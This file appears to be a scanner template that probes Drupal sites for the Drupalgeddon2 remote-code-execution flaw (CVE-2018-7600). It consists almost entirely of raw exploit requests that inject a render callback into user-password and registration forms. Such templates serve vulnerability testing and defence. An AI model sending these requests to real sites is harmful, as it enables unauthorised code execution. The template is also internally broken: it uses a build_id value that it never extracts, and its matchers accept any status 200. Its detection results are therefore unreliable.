id: poc-yaml-drupal-cve-2018-7600-rce

info:
  name: poc-yaml-drupal-cve-2018-7600-rce
  author: xray-converter
  severity: critical
  tags: xray-converted,rce,cve-2018-7600,ct-133392
  reference:
    - https://github.com/dreadlocked/Drupalgeddon2
    - https://paper.seebug.org/567/

http:
  - raw:
      - |
        POST /?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]={{rand_base(8)}}%25%25{{rand_base(8)}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /?q=file%2Fajax%2Fname%2F%23value%2F{{build_id}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        form_build_id={{build_id}}
        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]={{rand_base(8)}}%25%25{{rand_base(8)}}
        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200